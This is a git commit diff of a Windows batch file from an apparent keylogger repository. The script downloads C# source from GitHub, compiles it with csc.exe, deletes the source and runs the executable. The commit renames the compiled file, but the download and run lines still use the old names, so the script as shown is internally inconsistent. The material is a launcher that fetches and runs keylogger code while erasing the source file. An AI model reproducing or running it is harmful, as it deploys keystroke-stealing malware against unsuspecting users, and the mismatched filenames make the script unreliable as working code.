35672e0042efd414f057acd738a8ed663c39e2a4
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-07 15:12:04 -0300

    Update startreal.bat

--- startreal.bat
+++ startreal.bat
@@ -1,4 +1,4 @@
 @echo off
 curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exrealtime.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exrealtime.cs
-erase exrealtime.cs & exrealtime.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitrealtime.cs
+erase exploitrealtime.cs & exrealtime.exe
